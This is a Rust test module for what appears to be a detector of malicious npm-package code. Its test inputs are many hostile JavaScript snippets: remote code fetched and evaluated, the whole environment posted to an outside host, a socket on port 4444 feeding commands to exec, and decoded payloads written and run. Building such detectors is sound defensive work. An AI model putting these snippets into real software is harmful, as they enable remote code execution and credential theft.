        assert_eq!(runs(&format!("function run(c) {{ return eval(c); }}\nfetch({}).then(r => r.text()).then(run);\n", url)), Some("run"));
        let src = format!("const axios = require('axios');\n(async () => {{ const {{ data }} = await axios.get({}); new Function(data)(); }})();\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!(
            "const https = require('https');\nconst vm = require('vm');\nhttps.get({}, (res) => {{ let b = ''; res.on('data', (d) => {{ b += d; }}); \
             res.on('end', () => vm.runInThisContext(b)); }});\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // what a download prints; what a socket is sent, run as a command
        let src = format!("const {{ execSync }} = require('child_process');\nconst u = {};\neval(execSync(`curl -s ${{u}}`).toString());\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = "const net = require('net');\nconst cp = require('child_process');\nconst s = net.connect(4444, '198.51.100.7');\n\
                   s.on('data', (d) => cp.exec(d.toString()));\n";
        assert_eq!(runs(src), Some("run"));
        // an interpreter given it as code
        let src = format!(
            "const {{ spawn }} = require('child_process');\nfetch({}).then(r => r.text()).then(b => spawn(process.execPath, ['-e', b]));\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // eval's other forms
        for call in ["(0, eval)(c)", "eval.call(null, c)", "global['ev' + 'al'](c)", "[].constructor.constructor(c)()"] {
            let src = format!("fetch({}).then(r => r.text()).then(c => {});\n", url, call);
            assert_eq!(runs(&src), Some("run"), "{}", call);
        }
        // a module it is told to load; data a deserializer runs
        let src = format!("const axios = require('axios');\naxios.get({}).then(({{ data }}) => require(data.plugin));\n", url);
        assert_eq!(runs(&src), Some("import"));
        assert_eq!(runs(&format!("fetch({}).then(r => r.text()).then(n => import(n));\n", url)), Some("import"));
        let src = format!("const s = require('node-serialize');\nfetch({}).then(r => r.text()).then(t => s.unserialize(t));\n", url);
        assert_eq!(runs(&src), Some("deserialize"));
        // a runner given as the callback; Function's constructor (chai-use-chain's form)
        assert_eq!(runs(&format!("fetch({}).then(r => r.text()).then(eval);\n", url)), Some("run"));
        let src = format!(
            "const axios = require('axios');\n(async () => {{ const s = (await axios.get({})).data.cookie; \
             const h = new Function.constructor('require', s); h(require); }})();\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // the script's own address: decoded, a fallback, a dead drop's, a socket's
        let src = format!("fetch(atob('{}')).then(r => r.text()).then(eval);\n", "aHR0cHM6Ly9jb2xsZWN0LmludmFsaWQvcC5qcw==");
        assert_eq!(runs(&src), Some("run"));
        let src = format!("const u = process.env.PAYLOAD_URL || {};\nfetch(u).then(r => r.text()).then(eval);\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!("fetch({}).then(r => r.text()).then(next => fetch(next)).then(r => r.text()).then(eval);\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!("const WebSocket = require('ws');\nconst ws = new WebSocket('wss://{}/c');\nws.on('message', (m) => eval(m.toString()));\n", HOST);
        assert_eq!(runs(&src), Some("run"));
        // names as one-string lists (what the decoded view of a string-array
        // obfuscation leaves: query-logger's form)
        let src = format!("module.exports = () => require('axios')[['post']]({}, {{ ...process.env }})[['then']](r => eval(r.data));\n", url);
        assert_eq!(runs(&src), Some("run"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // the script's own downloader, through other names; a variable of the
        // environment it stores it in; an exec its require is left out of
        let src = format!("const f0 = (u) => fetch(u);\nconst f1 = (u) => f0(u);\n(async () => {{ eval(await (await f1({})).text()); }})();\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!(
            "const axios = require('axios');\n(async () => {{ process.env['M'] = (await axios.get({})).data; require(process.env.M); }})();\n",
            url
        );
        assert_eq!(runs(&src), Some("import"));
        assert_eq!(runs(&format!("(async () => execSync(`node -e ${{await (await fetch({})).text()}}`))();\n", url)), Some("run"));
        // an interpreter given it as code on a command line
        let src = format!(
            "const {{ exec }} = require('child_process');\nfetch({}).then(r => r.text()).then(c => exec('node -e ' + JSON.stringify(c)));\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // none: a constant, a response only parsed or shown, a local file run
        assert_eq!(runs("eval('1 + 1');\n"), None);
        assert_eq!(runs(&format!("fetch({}).then(r => r.json()).then(d => console.log(JSON.parse(d)));\n", url)), None);
        assert_eq!(runs("const fs = require('fs');\neval(fs.readFileSync('x.js', 'utf8'));\n"), None);
        // none: a library's request for its caller (jQuery's script loader, CoffeeScript's)
        assert_eq!(runs("function load(url) { return fetch(url).then(r => r.text()).then(eval); }\nmodule.exports = load;\n"), None);
        let src = "function load(url) { const x = new XMLHttpRequest(); x.open('GET', url); \
                   x.onload = () => Function(x.responseText)(); x.send(); }\nload(document.currentScript.src);\n";
        assert_eq!(runs(src), None);
        // none: a fixed program given the data as its argument
        let src = format!(
            "const {{ exec }} = require('child_process');\nfetch({}).then(r => r.text()).then(ip => exec(`curl -s https://{}/?ip=${{ip}}`));\n",
            url, HOST
        );
        assert_eq!(runs(&src), None);
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfetch({}).then(r => r.json()).then(j => {{ let cmd = `npm publish --registry=${{j.registry}}`; cmd += ' --access public'; execSync(cmd); }});\n",
            url
        );
        assert_eq!(runs(&src), None);
        // code in a string is not code
        assert_eq!(runs(&format!("const doc = `fetch({}).then(r => r.text()).then(eval)`;\n", url)), None);
    }

    #[test]
    fn commands_from_a_constant_list() {
        let send = format!("require('https').get('https://{}/?d=' + out);", HOST);
        // for-of
        let src = format!(
            "const {{ execSync }} = require('child_process');\nlet out = '';\nfor (const c of ['whoami', 'id']) {{ out += execSync(c).toString(); }}\n{}\n",
            send
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // a callback given each (react-sdk-module-api's form)
        let src = format!(
            "const {{ exec }} = require('child_process');\nconst cmds = ['whoami', 'uname -a'];\ncmds.forEach((cmd) => {{ exec(cmd, (e, out) => {{ {} }}); }});\n",
            send
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // an index into the list
        let src = format!(
            "const {{ execSync }} = require('child_process');\nconst cmds = ['whoami'];\nfor (let i = 0; i < cmds.length; i++) {{ const out = execSync(cmds[i]).toString(); {} }}\n",
            send
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
    }

    #[test]
    fn evasions_of_the_text_follower() {
        let post = format!("fetch('https://{}/x', {{method: 'POST', body: JSON.stringify(process.env)}});\n", HOST);
        // a quote in a regular expression begins no string
        assert_eq!(sent(&format!("const q = /'/g; {}", post)), found("environment", "the whole environment"));
        // padding before the payload: no window, no cap on assignments
        let mut src = String::from("const v = JSON.stringify(process.env);\n");
        for k in 0..6000 {
            src.push_str(&format!("var a{} = {};\n", k, k));
        }
        src.push_str(&format!("fetch('https://{}/x', {{method: 'POST', body: v}});\n", HOST));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // code in a string is not code
        let src = format!("const doc = `fetch('https://{}/x', {{body: JSON.stringify(process.env)}})`;\n", HOST);
        assert_eq!(sent(&src), None);
    }

    /// The lines of the code the text decodes and runs (each run's line,
    /// the decoding's).
    fn decoded(src: &str) -> Vec<(usize, usize)> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        let line = |at: usize| text[..at.min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1;
        match facts_here(&text) {
            Some(f) => f.decoded.iter().map(|&(at, from)| (line(at), line(from))).collect(),
            None => panic!("not read: {}", src),
        }
    }

    #[test]
    fn code_it_decodes_and_runs() {
        // atob, Buffer.from(…, 'base64'), a decryption: run as code
        assert_eq!(decoded("eval(atob('Y29uc29sZS5sb2coMSk='));\n"), vec![(1, 1)]);
        let src = "const s = Buffer.from(p, 'base64').toString();\nconst f = new Function(s);\nf();\n";
        assert_eq!(decoded(src), vec![(2, 1)]);
        let src = "const CryptoJS = require('crypto-js');\nconst c = CryptoJS.AES.decrypt(blob, key).toString(CryptoJS.enc.Utf8);\nrequire('vm').runInThisContext(c);\n";
        assert_eq!(decoded(src), vec![(3, 2)]);
        // through the script's own function
        let src = "function unpack(x) { return atob(x); }\neval(unpack('Y29uc29sZS5sb2coMSk='));\n";
        assert_eq!(decoded(src), vec![(2, 1)]);
        // child_process imported dynamically; any object's execSync (a regular expression's exec is not)
        let src = "const t = atob(p);\nconst cp = await import('child_process');\ncp.exec(t);\n";
        assert_eq!(decoded(src), vec![(3, 1)]);
        assert_eq!(decoded("const t = atob(p);\nanything.execSync(t);\n"), vec![(2, 1)]);
        assert_eq!(decoded("const t = atob(p);\nconst m = /x/.exec(t);\nre.exec(t);\n"), vec![]);
        // not run, encoded rather than decoded, or code in a string: nothing
        assert_eq!(decoded("const s = atob(p);\nconsole.log(s);\n"), vec![]);
        assert_eq!(decoded("const u = `data:text/javascript;base64,${Buffer.from(code).toString('base64')}`;\neval(code);\n"), vec![]);
        let src = "var kWorkerCode = `\nself.onmessage = (e) => {\n  const script = atob(e.data.scriptContent);\n  new Function(script)();\n};\n`;\n";
        assert_eq!(decoded(src), vec![]);
        // a program it decodes, run; a fixed program given decoded data: nothing
        let src = "const { spawnSync } = require('child_process');\nconst cmd = Buffer.from(b, 'base64').toString();\nspawnSync(cmd, ['-q']);\n";
        assert_eq!(decoded(src), vec![(3, 2)]);
        assert_eq!(decoded("const cp = require('child_process');\ncp.execFileSync('git', ['apply', atob(p)]);\n"), vec![]);
        assert_eq!(decoded("const m = /x/.exec(atob(p));\n"), vec![]);
        // es-module-lexer's shape: a WebAssembly module decoded from base64, whose exports' answers a
        // string evaluator reads, runs no code it decodes
        let src = "let Q;\nfunction N(C){try{return(0,eval)(C)}catch{}}\nfunction parse(s){const a=Q.sa(s.length);return N(s.slice(Q.ss(),Q.se()))}\nconst F=WebAssembly.compile(typeof Buffer<'u'?Buffer.from(L,'base64'):Uint8Array.from(atob(L),A=>A.charCodeAt(0))).then(WebAssembly.instantiate).then(({exports:A})=>{Q=A});\nvar L='AGFzbQ';\nexports.parse=parse;\n";
        assert_eq!(decoded(src), vec![]);
    }

    fn dropped(src: &str) -> Option<(usize, u16, String, Option<String>)> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        match facts_here(&text) {
            Some(f) => f.dropped.map(|d| (d.line, d.kinds, pystr::to_string(&d.what), d.interp.map(|i| pystr::to_string(&i)))),
            None => panic!("not read: {}", src),
        }
    }

    #[test]
    fn files_it_writes_then_runs() {
        // a program carved out of an image the package ships, written, made executable, run
        let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nconst img = fs.readFileSync(__dirname + '/logo.png');\nconst exe = img.subarray(4096);\nconst p = require('os').tmpdir() + '/helper';\nfs.writeFileSync(p, exe);\nfs.chmodSync(p, 0o755);\nspawn(p, [], { detached: true });\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.1, d.2)), Some((8, K_CARVED, "logo.png".to_string())));
        // a decoded script, by a stream, run by node; a constant path in a command line
        let src = "const fs = require('fs');\nconst ws = fs.createWriteStream('/tmp/x.js');\nws.write(Buffer.from(B, 'base64'));\nws.end();\nrequire('child_process').execSync('node /tmp/x.js');\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.1 & K_DECODED != 0, d.3)), Some((5, true, Some("node".into()))));
        let src = "const fs = require('fs');\nconst cp = require('child_process');\nconst f = '/tmp/' + Date.now() + '.sh';\nfs.writeFileSync(f, atob(B));\ncp.exec('chmod +x ' + f + ' && ' + f);\n";
        assert_eq!(dropped(src).map(|d| d.0), Some(5));
        let src = "const fs = require('fs');\nconst { fork } = require('child_process');\nconst p = `${__dirname}/w.js`;\nfs.writeFileSync(p, require('zlib').inflateSync(blob));\nfork(p);\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((5, Some("node".into()))));
        // a download written, run by an interpreter; a binary downloaded and run (installers): nothing
        // (what a callback is given is followed by the function's summary, which keeps no file: not yet)
        let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/i.js');\n  fs.writeFileSync('i.js', await res.text());\n  spawn(process.execPath, ['i.js']);\n}\ngo();\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.1, d.3)), Some((6, K_RECEIVED, Some("node".into()))));
        let src = "const fs = require('fs');\nconst { execFileSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/bin');\n  fs.writeFileSync('bin/tool', Buffer.from(await res.arrayBuffer()));\n  execFileSync('bin/tool', ['--version']);\n}\ngo();\n";
        assert_eq!(dropped(src), None);
        // cmd runs a batch file as a script, anything else as a program
        let src = "const fs = require('fs');\nconst { execSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/x');\n  fs.writeFileSync('run.cmd', await res.text());\n  execSync('cmd /c run.cmd');\n}\ngo();\n";
        assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((6, Some("cmd".into()))));
        let src = "const fs = require('fs');\nconst { execSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/x');\n  fs.writeFileSync('setup.exe', Buffer.from(await res.arrayBuffer()));\n  execSync('cmd /c setup.exe /S');\n}\ngo();\n";
        assert_eq!(dropped(src), None);
        // a whole file copied and run, text written and run, another function's local: nothing
        let src = "const fs = require('fs');\nconst { spawnSync } = require('child_process');\nfs.writeFileSync('/tmp/t', fs.readFileSync('pkg/t'));\nspawnSync('/tmp/t');\n";
        assert_eq!(dropped(src), None);
        let src = "const fs = require('fs');\nconst { execSync } = require('child_process');\nfs.writeFileSync('/tmp/x.sh', 'echo hi');\nexecSync('sh /tmp/x.sh');\n";
        assert_eq!(dropped(src), None);
        let src = "const fs = require('fs');\nconst { spawnSync } = require('child_process');\nfunction save(d) { const p = 'out.bin'; fs.writeFileSync(p, atob(d)); }\nfunction run(p) { spawnSync(p, ['--help']); }\n";
        assert_eq!(dropped(src), None);
        // a text read sliced is not a binary's
        let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nconst s = fs.readFileSync('a.txt', 'utf8').slice(10);\nfs.writeFileSync('/tmp/a', s);\nspawn('/tmp/a');\n";
        assert_eq!(dropped(src), None);
    }

    #[test]
    fn what_popular_packages_do() {
        // a library's loader fetches the address it is given, or works out
        // from what it is given (Monaco's, vitest's): not the script's own
        // download; the script's own address is
        let given = "function load(u) {\n  fetch(u).then((r) => r.text()).then((t) => { new Function(t).call(self); });\n}\nmodule.exports = load;\n";
        assert_eq!(runs(given), None);
        let method = "class Loader {\n  load(e, i, s, n) {\n    fetch(i).then((o) => o.text()).then((o) => { new Function(o).call(self); s(); });\n  }\n}\nmodule.exports = Loader;\n";
        assert_eq!(runs(method), None);
        let config = "class Loader {\n  load(e, i, s, n) {\n    const { trustedTypesPolicy: l } = e.getConfig().getOptionsLiteral();\n    fetch(i).then((o) => o.text()).then((o) => { (l ? self.eval(l.createScript('', o)) : new Function(o)).call(self); s(); });\n  }\n}\nmodule.exports = Loader;\n";
        assert_eq!(runs(config), None);
        assert_eq!(runs(&format!("fetch('https://{}/p').then((r) => r.text()).then((t) => {{ new Function(t)(); }});\n", HOST)), Some("run"));
        assert_eq!(runs(&format!("const base = 'https://{}';\nfetch(base + '/p').then((r) => r.text()).then(eval);\n", HOST)), Some("run"));
        // an item of a list the script writes (a fallback's addresses) is its own
        let fallback = format!(
            "const axios = require('axios');\nconst domain = 'api.' + 'invalid';\nconst check = async () => {{\n  const urls = [`https://${{domain}}/a`, `https://{}/b`];\n\
             for (const url of urls) {{\n    const response = await axios.get(url);\n    new Function('require', response.data.model)(require);\n  }}\n}};\nmodule.exports = check;\n",
            HOST
        );
        assert_eq!(runs(&fallback), Some("run"));
        // a global the script reads as a value (what the page or another
        // file defines) is its own address, given to a request or to the
        // script's own downloader; the platform's objects are not, nor is
        // an object (a namespace TypeScript's emit passes its module function:
        // Monaco's AMDLoader)
        assert_eq!(runs("const axios = require('axios');\n(async function () {\n  const s = (await axios.get(src)).data;\n  eval(s);\n})();\n"), Some("run"));
        let get = "const get = (u) => fetch(u).then((r) => r.text());\n";
        assert_eq!(runs(&format!("{}get(src).then((t) => eval(t));\n", get)), Some("run"));
        assert_eq!(runs(&format!("{}get('https://{}/' + process.platform).then((t) => eval(t));\n", get, HOST)), Some("run"));
        assert_eq!(runs(&format!("{}get(typeof window !== 'undefined' ? window : global).then((t) => eval(t));\n", get)), None);
        assert_eq!(runs(&format!("{}get(location).then((t) => eval(t));\n", get)), None);
        assert_eq!(runs(&format!("var NS;\n{}get(NS || (NS = {{}})).then((t) => eval(t));\n", get)), None);
        // what a server is sent is received: its handler's request, its
        // data events; the server itself, its address and options, and its
        // other events are not (vite's dev server)
        let body = "const http = require('http');\nhttp.createServer((req, res) => { let b = ''; req.on('data', (d) => b += d); req.on('end', () => eval(b)); }).listen(8080);\n";
        assert_eq!(runs(body), Some("run"));
        let event = "const http = require('http');\nconst server = http.createServer();\nserver.on('request', (req, res) => { req.on('data', (d) => eval(d.toString())); });\nserver.listen(8080);\n";
        assert_eq!(runs(event), Some("run"));
        let socket = "const net = require('net');\nnet.createServer((sock) => { sock.on('data', (d) => require('child_process').exec(d.toString())); }).listen(4444);\n";
        assert_eq!(runs(socket), Some("run"));
        let itself = "const http = require('http');\nfunction makeApp(cfg) { return { url: 'http://localhost:' + cfg.port, cfg }; }\nconst server = http.createServer((req, res) => res.end('ok'));\nconst app = makeApp({ port: 3000, server });\neval(app.cfg.server.address().port.toString());\n";
        assert_eq!(runs(itself), None);
        let error = "const http = require('http');\nconst server = http.createServer();\nserver.on('error', (e) => eval(e.message));\n";
        assert_eq!(runs(error), None);
        // a Node module's objects are Node's: createHash(…).update(k) is not
        // the script's update(), which other code's value would reach
        let hash = format!(
            "const https = require('https');\nconst {{ createHash }} = require('crypto');\nclass Doc {{ update(s, e, content) {{ this.c = content; }} toString() {{ return this.c; }} }}\n\
             const d = new Doc();\nhttps.get('https://{}/x', (res) => {{ res.on('data', (k) => {{ createHash('sha1').update(k); }}); }});\neval(d.toString());\n",
            HOST
        );
        assert_eq!(runs(&hash), None);
        // createRequire makes a require, under any name, through a bundler's wrapper
        let made = format!(
            "import {{ createRequire }} from 'module';\nconst require = createRequire(import.meta.url);\n\
             require('https').get('https://{}/x', (r) => {{ let b = ''; r.on('data', (c) => {{ b += c; }}); r.on('end', () => eval(b)); }});\n",
            HOST
        );
        assert_eq!(runs(&made), Some("run"));
        let shim = format!(
            "import {{ createRequire }} from 'node:module';\nvar __require = /* @__PURE__ */ (() => createRequire(import.meta.url))();\n\
             const cp = __require('child_process');\nconst https = __require('https');\n\
             https.get('https://{}/x', (r) => {{ let b = ''; r.on('data', (c) => {{ b += c; }}); r.on('end', () => cp.exec(b)); }});\n",
            HOST
        );
        assert_eq!(runs(&shim), Some("run"));
    }

    #[test]
    fn a_selection_of_the_environment_in_a_loop() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: JSON.stringify({}) }});\n", HOST, v);
        // a loop whose test selects variables by name (vite's loadEnv)
        let src = format!("const env = {{}};\nfor (const k in process.env) if (k.startsWith('VITE_')) env[k] = process.env[k];\n{}", post("env"));
        assert_eq!(sent(&src), None);
        let src = format!(
            "const env = {{}};\nfor (const k of Object.keys(process.env)) {{ if (k.startsWith('APP_')) {{ env[k] = process.env[k]; }} }}\n{}",
            post("env")
        );
        assert_eq!(sent(&src), None);
        // a test that excludes some, names secrets, or doesn't read the
        // variable selects nothing: the whole environment
        let src = format!("const env = {{}};\nfor (const k in process.env) if (!k.startsWith('npm_')) env[k] = process.env[k];\n{}", post("env"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        let src = format!("const out = {{}};\nfor (const [k, v] of Object.entries(process.env)) if (k.includes('TOKEN')) out[k] = v;\n{}", post("out"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        let src = format!(
            "const env = {{}};\nconst verbose = process.argv.length > 2;\nfor (const k in process.env) {{ if (verbose) {{ env[k] = process.env[k]; }} }}\n{}",
            post("env")
        );
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // (a body that does more than test them: no selection)
        let src = format!("const env = {{}};\nfor (const k in process.env) {{ env[k] = process.env[k]; if (k.startsWith('X_')) break; }}\n{}", post("env"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // what the names a test reads are given is its text: a list of secrets' patterns, a
        // prefix parameter's default
        let src = format!(
            "const sensitive = [/TOKEN/i, /SECRET/i, /^AWS_/i];\nconst out = {{}};\n\
             for (const [k, v] of Object.entries(process.env)) {{\n  if (sensitive.some((p) => p.test(k))) out[k] = v;\n}}\n{}",
            post("out")
        );
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        let src = format!(
            "function load(prefixes = ['VITE_']) {{\n  const env = {{}};\n\
             for (const key in process.env) if (prefixes.some((p) => key.startsWith(p))) env[key] = process.env[key];\n  return env;\n}}\n{}",
            post("load()")
        );
        assert_eq!(sent(&src), None);
        // the .filter rule reads them the same way
        let src = format!(
            "const KEYS = ['GITHUB_TOKEN', 'NPM_TOKEN'];\nconst out = Object.entries(process.env).filter(([k]) => KEYS.includes(k));\n{}",
            post("out")
        );
        assert_eq!(sent(&src), found("environment", "the whole environment"));
    }

    #[test]
    fn what_the_in_sample_misses_do() {
        // the request client (react-svg-helper-fast, react-zutils): its calls
        // receive, through their callback, and its forks' and defaults' too
        let run = |call: &str| format!("const request = require('request');\n{}, (e, r, body) => {{ eval(body); }});\n", call);
        for call in [
            format!("request({{ url: 'https://{}/a' }}", HOST),
            format!("request('https://{}/a'", HOST),
            format!("request.get('https://{}/a'", HOST),
            format!("request.post({{ url: 'https://{}/a', form: {{}} }}", HOST),
            format!("request.defaults({{ timeout: 5 }})('https://{}/a'", HOST),
        ] {
            assert_eq!(runs(&run(&call)), Some("run"), "{}", call);
        }
        let fork = format!("const r = require('@cypress/request');\nr.get('https://{}/a', (e, x, b) => eval(b));\n", HOST);
        assert_eq!(runs(&fork), Some("run"));
        // what it sends: its options' form, formData, body, json
        let send = format!(
            "const request = require('request');\nrequest.post({{ url: 'https://{}/c', form: {{ env: JSON.stringify(process.env) }} }}, () => {{}});\n",
            HOST
        );
        assert_eq!(sent(&send), found("environment", "the whole environment"));
        // a member named by a constant, as decoding leaves an obfuscated call
        let named = format!("const x = require('request'), N = ('post', 'get');\nx[N]('https://{}/a', (e, r, b) => {{ eval(b); }});\n", HOST);
        assert_eq!(runs(&named), Some("run"));
        let module = format!("const i = 'request';\nconst x = require(i);\nx.get('https://{}/a', (e, r, b) => eval(b));\n", HOST);
        assert_eq!(runs(&module), Some("run"));
        // a parameter whose default is the script's own address is that
        // address when its caller gives none (react-svg-helper-fast's getPlugin);
        // one with no default, or a default its caller gives, is the caller's
        let default = format!(
            "const request = require('request');\nconst options = {{ url: 'https://{}/icons/' }};\n\
             function getPlugin(token = '101', opts = options) {{\n  opts.url = `${{opts.url}}${{token}}`;\n  request(opts, (e, r, b) => {{ eval(JSON.parse(b).credits); }});\n}}\nmodule.exports = {{ getPlugin }};\n",
            HOST
        );
        assert_eq!(runs(&default), Some("run"));
        let given = "const request = require('request');\nfunction load(opts) {\n  request(opts, (e, r, b) => { eval(b); });\n}\nmodule.exports = load;\n";
        assert_eq!(runs(given), None);
        let from_caller = "const request = require('request');\nfunction load(base, opts = { url: base }) {\n  request(opts, (e, r, b) => { eval(b); });\n}\nmodule.exports = load;\n";
        assert_eq!(runs(from_caller), None);
    }

    #[test]
    fn instances_of_a_class_made_in_several_places() {
        // each instance holds what it is given; one's members are not
        // another's (every MagicString of vite's plugins)
        let other = "class S { constructor(c) { this.c = c; } update(x) { this.c = this.c + x; return this; } toString() { return this.c; } }\n\
                     const s1 = new S('a');\ns1.update(Buffer.from(process.argv[2], 'hex').toString());\nconst s2 = new S(process.argv[3]);\neval(s2.toString());\n";
        assert_eq!(decoded(other), vec![]);
        let same = "class S { constructor(c) { this.c = c; } update(x) { this.c = this.c + x; return this; } toString() { return this.c; } }\n\
                    const s1 = new S('a');\ns1.update(Buffer.from(process.argv[2], 'hex').toString());\nconst s2 = new S('b');\neval(s1.toString());\n";
        assert_eq!(decoded(same), vec![(5, 3)]);
        let made = "class Box { constructor(v) { this.v = v; } get() { return this.v; } }\nconst a = new Box('x');\n\
                    const b = new Box(Buffer.from(process.argv[2], 'base64').toString());\neval(b.get());\n";
        assert_eq!(decoded(made), vec![(4, 3)]);
        // what its methods read themselves is still every instance's
        let fetched = format!(
            "class Loader {{ constructor() {{ this.code = null; }} async load() {{ const r = await fetch('https://{}/p'); this.code = await r.text(); }} run() {{ eval(this.code); }} }}\n\
             const l = new Loader();\nconst l2 = new Loader();\nl.load().then(() => l.run());\n",
            HOST
        );
        assert_eq!(runs(&fetched), Some("run"));
        // a class made once keeps one binding per member
        let once = format!(
            "class Runner {{ setCode(c) {{ this.c = c; }} run() {{ eval(this.c); }} }}\nconst r1 = new Runner();\n\
             fetch('https://{}/p').then((x) => x.text()).then((t) => {{ r1.setCode(t); r1.run(); }});\n",
            HOST
        );
        assert_eq!(runs(&once), Some("run"));
    }
}
